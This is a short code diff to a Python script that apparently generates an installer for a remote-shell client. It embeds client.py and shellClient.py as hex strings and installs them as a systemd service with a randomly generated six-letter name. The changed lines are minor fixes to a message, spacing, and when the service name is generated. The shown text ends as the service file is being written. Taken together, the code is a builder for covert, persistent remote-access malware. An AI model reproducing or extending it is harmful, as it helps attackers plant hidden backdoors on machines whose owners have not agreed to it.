@@ -7,7 +7,7 @@ import os
 
 def createInstaller(host):
     if(os.path.exists('./client.py') and os.path.exists('./shellClient.py')):
-        print("Creating installer located at ./installer.sh...")
+        print("Creating installer located at ./installer.py...")
         f = open('./client.py', 'r')
         clientConts = f.read()
         f.close()
@@ -20,10 +20,10 @@ def createInstaller(host):
 #!/usr/bin/env python3
 import os
 import random
-CLIENTCONTS=""" + clientConts.encode().hex() + """
-SECCLIENTCONTS=""" + shellConts.encode().hex() + """
+CLIENTCONTS = """ + clientConts.encode().hex() + """
+SECCLIENTCONTS = """ + shellConts.encode().hex() + """
 
-SERVICE_NAME = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=6))
+SERVICE_NAME = """ + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=6)) + """
 
 f = open('/etc/systemd/system/' + SERVICE_NAME + '.service', 'w')
 serviceConts = \"""
